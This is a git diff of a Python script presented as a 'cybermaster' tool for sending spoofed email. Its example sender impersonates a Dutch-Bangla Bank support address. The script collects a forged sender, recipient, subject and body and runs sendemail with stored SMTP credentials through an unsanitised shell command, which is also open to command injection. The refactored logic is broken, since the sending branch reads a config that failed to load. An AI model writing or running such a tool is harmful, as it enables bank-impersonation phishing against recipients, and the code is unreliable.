@@ -21,13 +21,10 @@ def print_colored_figlet_text(text, color):
     # Apply color after figlet
     print(colored_text) 
 
-
-
-def send_email():
+def main():
     print_colored_figlet_text("KORISHEE THE CYBERMASTER", Fore.GREEN)
     print_with_animation(f"{Fore.RED}PRESENTING A AUTOMATED REMOTE ACCESS TROJEN BINDERS FROM")
     # Read configuration from file
-def load_config():
     # Get the path to the directory containing the current script
     script_dir = os.path.dirname(os.path.abspath(__file__))
     # Construct the path to the config.json file within the package data directory
@@ -37,33 +34,23 @@ def load_config():
         # Open and read the config.json file
         with open(config_file_path) as config_file:
             config = json.load(config_file)
-        return config
+        # Configuration loaded successfully, use it as needed
+        print("Configuration loaded successfully:", config)
     except FileNotFoundError:
         print("Config file not found or invalid.")
-        return None
-config = load_config()
+        print_with_animation(f"{Fore.RED}Please enter the credentials to send spoofed mail")
+        sender_name = input("Enter sender's name and email (e.g., 'From DBBL Support <ccs.cmc@dutchbanglabank.com>'): ")
+        receiver_email = input("Enter recipient's email: ")
+        subject = input("Enter the email subject: ")
+        message = input("Enter the message: ")
 
-# Check if configuration was loaded successfully
-if config:
-    # Configuration loaded successfully, use it as needed
-    print("Configuration loaded successfully:", config)
-else:
-    # Configuration loading failed
-    print("Failed to load configuration.")
-    
-    print_with_animation(f"{Fore.RED}Please enter the credentials to send spoofed mail")
-    sender_name = input("Enter sender's name and email (e.g., 'From DBBL Support <ccs.cmc@dutchbanglabank.com>'): ")
-    receiver_email = input("Enter recipient's email: ")
-    subject = input("Enter the email subject: ")
-    message = input("Enter the message: ")
+        sendemail_command = f"sendemail -xu {config['username']} -xp {config['password']} -s {config['smtp_server']} -f {sender_name} -t {receiver_email} -u '{subject}' -m '{message}'"
 
-    sendemail_command = f"sendemail -xu {config['username']} -xp {config['password']} -s {config['smtp_server']} -f {sender_name} -t {receiver_email} -u '{subject}' -m '{message}'"
+        try:
+            subprocess.run(sendemail_command, shell=True, check=True)
+            print("Email sent successfully!")
+        except subprocess.CalledProcessError as e:
+            print(f"Error: {e}")
 
-    try:
-        subprocess.run(sendemail_command, shell=True, check=True)
-        print("Email sent successfully!")
-    except subprocess.CalledProcessError as e:
-        print(f"Error: {e}")
-
-# Usage - Execute the function to send the email
-send_email()
+if __name__ == "__main__":
+    main()
